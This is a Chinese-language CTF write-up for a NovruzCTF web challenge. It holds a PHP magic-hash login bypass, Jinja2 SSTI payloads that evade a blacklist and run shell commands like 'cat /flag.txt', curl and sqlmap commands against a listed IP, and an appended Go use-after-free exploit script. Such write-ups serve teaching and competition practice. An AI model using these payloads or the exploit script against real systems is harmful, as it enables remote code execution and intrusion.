# NovruzCTF_Novruz Secret Keeper（Web）

## 题目信息
- 比赛：NovruzCTF
- 题目：Admin Panel（Web）
- 访问：http://103.54.19.209/
- 目标：获取 `novruzctf{...}`
- 状态：已解

## Flag
```text
novruzctf{Ch41n1ng_MD5_L00s3_C0mp4r1s0n_4nd_SSTI_w1th_N3w1ine_Byp4ss}
```

## 解题过程

### 1) 登录绕过（MD5 magic hash + 松散比较）
页面只有登录表单。常规弱口令无果，尝试 SQL 注入也无反应。猜测为 **PHP `md5()` + `==` 松散比较**。

使用经典 “magic hash” 密码：
- 用户名：`admin`
- 密码：`240610708`

成功进入仪表盘。该密码的 `md5()` 形如 `0e...`，在 PHP 松散比较下会被当作科学计数法 0，导致与期望的 `0e...` 等价。

### 2) 仪表盘发现 SSTI（Jinja2）
仪表盘有 `Report Title` 表单，输入会回显在：
```text
<h1>Report: {title}</h1>
```

普通 `{{7*7}}` 被过滤，但加入换行可绕过：
```text
{{
7*7
}}
```
回显 `49`，确认 **Jinja2 SSTI**。

### 3) WAF 黑名单绕过 + 读旗帜
直接使用 `__class__ / __init__ / __globals__` 会触发 “Hacking attempt detected!”。采用字符串拼接绕过黑名单：
- 使用 `"_"*2` 构造 `__`
- 使用 `attr()` 访问属性

读取根目录验证：
```text
{{
((cycler|attr("_"*2 ~ "init" ~ "_"*2)|attr("_"*2 ~ "globals" ~ "_"*2))["os"]).popen("ls /").read()
}}
```
看到 `/flag.txt` 后读取：
```text
{{
((cycler|attr("_"*2 ~ "init" ~ "_"*2)|attr("_"*2 ~ "globals" ~ "_"*2))["os"]).popen("cat /flag.txt").read()
}}
```
得到旗帜。

## 漏洞与知识点
1. **MD5 magic hash + PHP 松散比较**：`md5()` 结果形如 `0e...` 会被当作数值 0，导致错误等价判断。
2. **Jinja2 SSTI**：模板未做安全渲染，且过滤规则可被换行绕过。
3. **黑名单绕过**：用字符串拼接 + `attr()` 构造 dunder 属性，绕开关键词过滤。

## 知识点
- **MD5 magic hash** — `0e...` 字符串在松散比较中等价为 0
- **Jinja2 SSTI** — 模板执行上下文可被滥用
- **黑名单绕过** — 字符拼接与 `attr()` 规避关键字过滤

## 使用的工具
- 浏览器/请求重放（手工或 Burp/Playwright）
- 命令行 `curl` / `python` 辅助验证与提取

## 脚本归档
- Go：`CTF_Writeups/scripts_go/NovruzCTF_Novruz_Secret_Keeper.go`
- Python：`CTF_Writeups/scripts_python/NovruzCTF_Novruz_Secret_Keeper.py`

## 推荐工具与优化解题流程
根据扩展计划，Web 题优先使用现成工具，Crypto 用自研工具包：

1) **目录与端点发现（Web）** — `ffuf`
```text
ffuf -u http://103.54.19.209/FUZZ -w /path/to/wordlist.txt -fc 404
```
用于快速发现 `dashboard.php` 等隐藏页面。

2) **请求重放与调试（Web）** — `Burp Suite`
- 抓取登录与仪表盘请求
- 在 Repeater 中批量测试 `{{...}}`、换行绕过、黑名单绕过等 payload

3) **注入排查（Web）** — `SQLMap`（可选）
```text
sqlmap -u "http://103.54.19.209/" --data "login=admin&pwd=test" --batch
```
快速排除 SQL 注入方向，节省时间。

4) **MD5 验证（Crypto，自研工具包）** — `ctf_tools/crypto`
```text
cd ctf_tools/crypto
# 构建后使用 hash 子命令验证 magic hash
./crypto_toolkit hash -a md5 -t "240610708"
```
快速验证 `md5()` 是否呈现 `0e...` 形式。

### 工具对比总结
| 工具 | 适用阶段 | 本题耗时 | 优点 | 缺点 |
|------|----------|----------|------|------|
| **ffuf** | 目录/端点发现 | ~2 分钟 | 自动化发现页面 | 需要字典 |
| **Burp Suite** | 交互与调试 | ~5 分钟 | Repeater 迭代快 | 需要 GUI |
| **SQLMap** | 注入排查 | ~3 分钟 | 快速排除 SQLi | 误报时需手动确认 |
| **ctf_tools/crypto** | MD5 验证 | ~1 分钟 | 本地快速校验 | 需先构建工具 |
| **curl** | 纯命令行 | ~5 分钟 | 无 GUI 依赖 | 交互性较弱 |

### 推荐流程
**推荐流程**：ffuf 发现入口 → Burp 复现与测试 SSTI → ctf_tools/crypto 验证 magic hash → curl 自动化提取 → 5-10 分钟完成。

## 命令行提取关键数据（无 GUI）

### 1) 登录拿到 Cookie
```text
curl -i -s -c cookies.txt \
  -d "login=admin&pwd=240610708" \
  http://103.54.19.209/
```

### 2) 生成可复用的 URL 编码 payload
```text
python - <<'PY'
import urllib.parse
payload = """{{
((cycler|attr("_"*2 ~ "init" ~ "_"*2)|attr("_"*2 ~ "globals" ~ "_"*2))["os"]).popen("cat /flag.txt").read()
}}"""
print(urllib.parse.urlencode({"title": payload}))
PY
```

### 3) 发起请求并提取 flag
```text
curl -s -b cookies.txt \
  -d "$(python - <<'PY'
import urllib.parse
payload = """{{
((cycler|attr("_"*2 ~ "init" ~ "_"*2)|attr("_"*2 ~ "globals" ~ "_"*2))["os"]).popen("cat /flag.txt").read()
}}"""
print(urllib.parse.urlencode({"title": payload}))
PY
)" \
  http://103.54.19.209/dashboard.php | \
python - <<'PY'
import re,sys
html=sys.stdin.read()
m=re.search(r"novruzctf\{[^}]+\}", html)
print(m.group(0) if m else "not found")
PY
```

以上流程可在纯命令行环境完成登录、触发 SSTI、并抽取最终 Flag。

## 附：仓库中的 exploit.py 说明（独立 Pwn 脚本）
> 说明：该脚本是仓库内的 Pwn 解题脚本，目标端口为 `103.54.19.209:31337`，与本 Web 题不同，但按你的要求记录其核心逻辑。

`exploit.py` 主要行为：
1. 使用 `pwntools` 连接远端服务并进行菜单交互。
2. 先 `add_egg` 再 `remove_egg`，制造可控的已释放对象。
3. 构造 payload：`p64(WIN) + b'X'*8`，覆盖函数指针为 `WIN = 0x401335`。
4. `add_note` 写入原始字节（含 `\x00`），随后 `view_egg` 触发 `win`。

## Go 版本攻击脚本（与 exploit.py 等价逻辑）
> 仅用于授权 CTF 环境。

```go
package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
)

const (
	HOST = "103.54.19.209"
	PORT = 31337
	WIN  = 0x401335
)

func readUntil(r *bufio.Reader, delim []byte) {
	for {
		line, _ := r.ReadBytes('\n')
		if bytes.Contains(line, delim) {
			return
		}
	}
}

func sendLine(w *bufio.Writer, s string) {
	w.WriteString(s)
	w.WriteByte('\n')
	w.Flush()
}

func menu(r *bufio.Reader, w *bufio.Writer, c int) {
	readUntil(r, []byte("Choice:"))
	sendLine(w, fmt.Sprintf("%d", c))
}

func addEgg(r *bufio.Reader, w *bufio.Writer, owner []byte, strength int, pattern []byte) {
	menu(r, w, 1)
	readUntil(r, []byte("Owner name:"))
	w.Write(owner)
	w.WriteByte('\n')
	w.Flush()
	readUntil(r, []byte("Strength"))
	sendLine(w, fmt.Sprintf("%d", strength))
	readUntil(r, []byte("Egg pattern:"))
	w.Write(pattern)
	w.WriteByte('\n')
	w.Flush()
}

func viewEgg(r *bufio.Reader, w *bufio.Writer, idx int) {
	menu(r, w, 2)
	readUntil(r, []byte("Egg index"))
	sendLine(w, fmt.Sprintf("%d", idx))
}

func removeEgg(r *bufio.Reader, w *bufio.Writer, idx int) {
	menu(r, w, 3)
	readUntil(r, []byte("Egg index"))
	sendLine(w, fmt.Sprintf("%d", idx))
}

func addNote(r *bufio.Reader, w *bufio.Writer, judge []byte, verdict []byte) {
	menu(r, w, 4)
	readUntil(r, []byte("Judge name:"))
	w.Write(judge)
	w.WriteByte('\n')
	w.Flush()
	readUntil(r, []byte("Verdict:"))
	w.Write(verdict)
	w.WriteByte('\n')
	w.Flush()
}

func main() {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", HOST, PORT))
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	r := bufio.NewReader(conn)
	w := bufio.NewWriter(conn)

	addEgg(r, w, bytes.Repeat([]byte("A"), 8), 1, bytes.Repeat([]byte("B"), 8))
	removeEgg(r, w, 0)

	buf := make([]byte, 0, 16)
	p64 := make([]byte, 8)
	binary.LittleEndian.PutUint64(p64, WIN)
	buf = append(buf, p64...)
	buf = append(buf, bytes.Repeat([]byte("X"), 8)...)

	addNote(r, w, bytes.Repeat([]byte("J"), 8), buf)
	viewEgg(r, w, 0)

	// 这里可以继续读取输出或交互
}
```
